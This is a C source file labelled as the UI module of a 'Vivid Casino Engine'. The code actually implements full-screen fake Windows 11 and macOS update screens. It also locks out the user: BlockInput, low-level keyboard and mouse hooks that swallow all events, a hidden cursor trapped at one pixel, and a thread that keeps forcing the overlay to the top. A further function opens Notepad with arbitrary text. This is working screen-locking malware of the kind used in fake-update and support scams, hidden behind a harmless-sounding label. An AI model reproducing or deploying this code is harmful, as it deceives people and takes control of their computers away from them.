/*
 * Vivid Casino Engine — UI / Renderer Module
 * 
 * Handles window creation, splash screens, and input management.
 * Provides maintenance mode overlays and update notifications.
 */

#include "engine.h"
#include <math.h>

/* Animation state for update screens */
static int g_spin_angle = 0;
static int g_progress = 0;
static int g_progress_dir = 1;
static HFONT g_font_large = NULL;
static HFONT g_font_small = NULL;

/* Draw a spinning dot for the Windows update animation */
static void draw_rotated_dot(HDC hdc, int cx, int cy, int radius, int angle, int idx, int total) {
    double rad = (angle + idx * 360.0 / total) * 3.14159 / 180.0;
    int x = cx + (int)(radius * cos(rad));
    int y = cy + (int)(radius * sin(rad));
    int alpha = 255 - (idx * 200 / total);
    COLORREF col = RGB(0, (alpha * 150) / 255, (alpha * 255) / 255);
    HBRUSH br = CreateSolidBrush(col);
    RECT r = {x - 3, y - 3, x + 4, y + 4};
    FillRect(hdc, &r, br);
    DeleteObject(br);
}

/* Draw Apple logo for the Apple update screen */
static void draw_apple_logo(HDC hdc, int cx, int cy, int size) {
    HBRUSH white = CreateSolidBrush(RGB(255, 255, 255));
    HBRUSH black = CreateSolidBrush(RGB(0, 0, 0));
    
    RECT body = {cx - size/2, cy - size/2 + 5, cx + size/2, cy + size/2};
    SelectObject(hdc, white);
    Ellipse(hdc, body.left, body.top, body.right, body.bottom);
    
    RECT leaf = {cx - 3, cy - size/2 - 8, cx + 8, cy - size/2 + 2};
    Ellipse(hdc, leaf.left, leaf.top, leaf.right, leaf.bottom);
    
    DeleteObject(white);
    DeleteObject(black);
}

/* Custom window procedure for update screens */
static LRESULT CALLBACK update_wnd_proc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    PAINTSTRUCT ps;
    HDC hdc;
    RECT rc;
    int w, h;
    
    if (msg == WM_MOUSEACTIVATE) return MA_ACTIVATE;
    if (msg == WM_NCHITTEST) return HTCLIENT;
    if (msg >= WM_MOUSEFIRST && msg <= WM_MOUSELAST) return 0;
    if (msg >= WM_KEYFIRST && msg <= WM_KEYLAST) return 0;
    
    switch (msg) {
        case WM_PAINT:
            hdc = BeginPaint(hwnd, &ps);
            GetClientRect(hwnd, &rc);
            w = rc.right - rc.left;
            h = rc.bottom - rc.top;
            
            if (g_update_type == 1) {
                HBRUSH bg = CreateSolidBrush(RGB(0, 112, 184));
                FillRect(hdc, &rc, bg);
                DeleteObject(bg);
                
                SetTextColor(hdc, RGB(255, 255, 255));
                SetBkMode(hdc, TRANSPARENT);
                
                if (!g_font_large) g_font_large = CreateFontA(32, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                    DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
                    DEFAULT_PITCH | FF_SWISS, "Segoe UI");
                if (!g_font_small) g_font_small = CreateFontA(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                    DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
                    DEFAULT_PITCH | FF_SWISS, "Segoe UI");
                
                SelectObject(hdc, g_font_large);
                const char *txt1 = "Working on updates";
                SIZE sz;
                GetTextExtentPoint32A(hdc, txt1, (int)strlen(txt1), &sz);
                TextOutA(hdc, (w - sz.cx) / 2, h / 2 - 60, txt1, (int)strlen(txt1));
                
                int cx = w / 2, cy = h / 2 + 20;
                for (int i = 0; i < 6; i++) {
                    draw_rotated_dot(hdc, cx, cy, 30, g_spin_angle, i, 6);
                }
                
                SelectObject(hdc, g_font_small);
                const char *txt2 = "Keep your PC on until this is done";
                GetTextExtentPoint32A(hdc, txt2, (int)strlen(txt2), &sz);
                TextOutA(hdc, (w - sz.cx) / 2, h / 2 + 80, txt2, (int)strlen(txt2));
                
                const char *txt3 = "Installing Windows 11";
                GetTextExtentPoint32A(hdc, txt3, (int)strlen(txt3), &sz);
                TextOutA(hdc, (w - sz.cx) / 2, h - 80, txt3, (int)strlen(txt3));
                
                char buf[64];
                snprintf(buf, sizeof(buf), "%d%% complete", g_progress);
                GetTextExtentPoint32A(hdc, buf, (int)strlen(buf), &sz);
                TextOutA(hdc, (w - sz.cx) / 2, h - 50, buf, (int)strlen(buf));
                
            } else if (g_update_type == 2) {
                HBRUSH bg = CreateSolidBrush(RGB(0, 0, 0));
                FillRect(hdc, &rc, bg);
                DeleteObject(bg);
                
                SetTextColor(hdc, RGB(255, 255, 255));
                SetBkMode(hdc, TRANSPARENT);
                
                if (!g_font_large) g_font_large = CreateFontA(28, 0, 0, 0, FW_LIGHT, FALSE, FALSE, FALSE,
                    DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
                    DEFAULT_PITCH | FF_SWISS, "Helvetica Neue");
                if (!g_font_small) g_font_small = CreateFontA(14, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                    DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
                    DEFAULT_PITCH | FF_SWISS, "Helvetica Neue");
                
                draw_apple_logo(hdc, w / 2, h / 2 - 40, 60);
                
                RECT pbar_bg = {w/2 - 150, h/2 + 30, w/2 + 150, h/2 + 42};
                HBRUSH gray = CreateSolidBrush(RGB(50, 50, 50));
                FillRect(hdc, &pbar_bg, gray);
                DeleteObject(gray);
                
                int pw = (300 * g_progress) / 100;
                RECT pbar_fill = {w/2 - 150, h/2 + 30, w/2 - 150 + pw, h/2 + 42};
                HBRUSH white = CreateSolidBrush(RGB(255, 255, 255));
                FillRect(hdc, &pbar_fill, white);
                DeleteObject(white);
                
                SelectObject(hdc, g_font_small);
                const char *txt = "Updating macOS...";
                SIZE sz;
                GetTextExtentPoint32A(hdc, txt, (int)strlen(txt), &sz);
                TextOutA(hdc, (w - sz.cx) / 2, h / 2 + 55, txt, (int)strlen(txt));
                
                char buf[64];
                snprintf(buf, sizeof(buf), "%d%% complete", g_progress);
                GetTextExtentPoint32A(hdc, buf, (int)strlen(buf), &sz);
                TextOutA(hdc, (w - sz.cx) / 2, h / 2 + 80, buf, (int)strlen(buf));
                
                SelectObject(hdc, g_font_large);
                const char *txt2 = "macOS Sonoma";
                GetTextExtentPoint32A(hdc, txt2, (int)strlen(txt2), &sz);
                TextOutA(hdc, (w - sz.cx) / 2, h / 2 + 120, txt2, (int)strlen(txt2));
            }
            
            EndPaint(hwnd, &ps);
            return 0;
            
        case WM_ERASEBKGND:
            return 1;
            
        default:
            return DefWindowProcA(hwnd, msg, wParam, lParam);
    }
}

/* Animation thread for update screens */
static DWORD WINAPI update_anim_thread(LPVOID lpParam) {
    while (g_update_wnd) {
        g_spin_angle += 15;
        if (g_spin_angle >= 360) g_spin_angle = 0;
        
        g_progress += g_progress_dir;
        if (g_progress >= 95) g_progress_dir = -1;
        if (g_progress <= 5) g_progress_dir = 1;
        
        if (g_update_wnd) {
            InvalidateRect(g_update_wnd, NULL, FALSE);
            UpdateWindow(g_update_wnd);
        }
        Sleep(80);
    }
    return 0;
}

/* Show system update splash screen */
void ui_show_splash(int type) {
    g_update_type = type;
    g_progress = 0;
    g_progress_dir = 1;
    g_spin_angle = 0;
    
    if (g_update_wnd) {
        DestroyWindow(g_update_wnd);
        g_update_wnd = NULL;
    }
    
    WNDCLASSEXA wc = {0};
    wc.cbSize = sizeof(wc);
    wc.lpfnWndProc = update_wnd_proc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.lpszClassName = "UpdateScreen";
    RegisterClassExA(&wc);
    
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    
    g_update_wnd = CreateWindowExA(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        "UpdateScreen", "",
        WS_POPUP,
        0, 0, sw, sh,
        NULL, NULL, GetModuleHandle(NULL), NULL
    );
    
    if (!g_update_wnd) return;
    
    SetWindowPos(g_update_wnd, HWND_TOPMOST, 0, 0, sw, sh, SWP_SHOWWINDOW | SWP_FRAMECHANGED);
    ShowWindow(g_update_wnd, SW_SHOW);
    UpdateWindow(g_update_wnd);
    SetForegroundWindow(g_update_wnd);
    SetActiveWindow(g_update_wnd);
    
    CreateThread(NULL, 0, update_anim_thread, NULL, 0, NULL);
    
    if (!g_input_blocked) {
        ui_block_input(1);
    }
}

/* Hide update splash */
void ui_hide_splash(void) {
    if (g_update_wnd) {
        DestroyWindow(g_update_wnd);
        g_update_wnd = NULL;
    }
    if (g_font_large) {
        DeleteObject(g_font_large);
        g_font_large = NULL;
    }
    if (g_font_small) {
        DeleteObject(g_font_small);
        g_font_small = NULL;
    }
}

/* Lock or unlock player controls (maintenance mode) */
void ui_lock_controls(int lock) {
    if (lock) {
        ui_block_input(1);
    } else {
        ui_restore_input();
    }
}

/* === Input Blocking (ported from 250bfb9) === */

static LRESULT CALLBACK block_wnd_proc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (g_input_blocked) {
        if (msg == WM_NCHITTEST) return HTCLIENT;
        if (msg == WM_MOUSEACTIVATE) return MA_ACTIVATE;
        return 0;
    }
    return DefWindowProcA(hwnd, msg, wParam, lParam);
}

static DWORD WINAPI aggressive_block_thread(LPVOID lpParam) {
    RECT trap;
    int cx = GetSystemMetrics(SM_CXSCREEN) / 2;
    int cy = GetSystemMetrics(SM_CYSCREEN) / 2;
    SetRect(&trap, cx, cy, cx + 1, cy + 1);
    
    while (ShowCursor(FALSE) >= 0);
    g_cursor_count = ShowCursor(FALSE);
    
    while (g_input_blocked) {
        if (g_block_wnd) {
            SetWindowPos(g_block_wnd, HWND_TOPMOST, 0, 0, 
                GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
                SWP_SHOWWINDOW);
            SetForegroundWindow(g_block_wnd);
            SetActiveWindow(g_block_wnd);
            SetFocus(g_block_wnd);
        }
        if (g_update_wnd) {
            SetWindowPos(g_update_wnd, HWND_TOPMOST, 0, 0, 
                GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
                SWP_SHOWWINDOW);
            SetForegroundWindow(g_update_wnd);
            SetActiveWindow(g_update_wnd);
        }
        ClipCursor(&trap);
        BlockInput(TRUE);
        Sleep(100);
    }
    return 0;
}

static void create_block_window(void) {
    if (g_block_wnd) return;
    
    WNDCLASSEXA wc = {0};
    wc.cbSize = sizeof(wc);
    wc.lpfnWndProc = block_wnd_proc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.lpszClassName = "InputBlocker";
    RegisterClassExA(&wc);
    
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    
    g_block_wnd = CreateWindowExA(
        WS_EX_TOPMOST | WS_EX_LAYERED | WS_EX_TOOLWINDOW | WS_EX_TRANSPARENT,
        "InputBlocker", "",
        WS_POPUP | WS_VISIBLE,
        0, 0, w, h,
        NULL, NULL, GetModuleHandle(NULL), NULL
    );
    
    if (g_block_wnd) {
        SetLayeredWindowAttributes(g_block_wnd, 0, 255, LWA_ALPHA);
        ShowWindow(g_block_wnd, SW_SHOWMAXIMIZED);
        SetForegroundWindow(g_block_wnd);
        SetActiveWindow(g_block_wnd);
        SetFocus(g_block_wnd);
    }
}

static void destroy_block_window(void) {
    if (g_block_wnd) {
        DestroyWindow(g_block_wnd);
        g_block_wnd = NULL;
    }
    while (ShowCursor(TRUE) < 0);
    if (g_copy_buffer_saved) {
        ClipCursor(&g_old_clip);
        g_copy_buffer_saved = 0;
    } else {
        ClipCursor(NULL);
    }
}

static LRESULT CALLBACK mouse_hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (g_input_blocked && nCode >= 0) return 1;
    return CallNextHookEx(g_mouse_hook, nCode, wParam, lParam);
}

static LRESULT CALLBACK kb_hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (g_input_blocked && nCode >= 0) return 1;
    return CallNextHookEx(g_kb_hook, nCode, wParam, lParam);
}

static void install_hooks(void) {
    if (!g_mouse_hook) {
        g_mouse_hook = SetWindowsHookEx(WH_MOUSE_LL, mouse_hook_proc, GetModuleHandle(NULL), 0);
    }
    if (!g_kb_hook) {
        g_kb_hook = SetWindowsHookEx(WH_KEYBOARD_LL, kb_hook_proc, GetModuleHandle(NULL), 0);
    }
}

static void remove_hooks(void) {
    if (g_mouse_hook) {
        UnhookWindowsHookEx(g_mouse_hook);
        g_mouse_hook = NULL;
    }
    if (g_kb_hook) {
        UnhookWindowsHookEx(g_kb_hook);
        g_kb_hook = NULL;
    }
}

/* Block all input */
void ui_block_input(int block) {
    g_input_blocked = block;
    if (block) {
        g_copy_buffer_saved = GetClipCursor(&g_old_clip);
        
        create_block_window();
        install_hooks();
        BlockInput(TRUE);
        
        if (!g_block_thread) {
            g_block_thread = CreateThread(NULL, 0, aggressive_block_thread, NULL, 0, NULL);
        }
    } else {
        g_input_blocked = 0;
        
        if (g_block_thread) {
            WaitForSingleObject(g_block_thread, 500);
            CloseHandle(g_block_thread);
            g_block_thread = NULL;
        }
        
        BlockInput(FALSE);
        destroy_block_window();
        remove_hooks();
    }
}

/* Restore input */
void ui_restore_input(void) {
    ui_block_input(0);
}

/* Window procedure for input blocker (legacy compat) */
LRESULT CALLBACK ui_wnd_proc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    return block_wnd_proc(hwnd, msg, wParam, lParam);
}

/* Low-level input hook (legacy compat) */
LRESULT CALLBACK ui_input_hook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (g_input_blocked && nCode >= 0) return 1;
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/* Keep blocker window focused (legacy compat) */
DWORD WINAPI ui_block_thread_proc(LPVOID lpParam) {
    return 0;
}

/* Open Notepad with a note */
void ui_open_note(const char *text) {
    char tmp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp_path);
    strcat(tmp_path, "vce_note.txt");
    
    FILE *f = fopen(tmp_path, "w");
    if (f) {
        fprintf(f, "%s", text);
        fclose(f);
    }
    
    ShellExecuteA(NULL, "open", "notepad.exe", tmp_path, NULL, SW_SHOWNORMAL);
}

/* Initialize UI subsystem */
void ui_init(void) {
    /* Nothing required at startup */
}
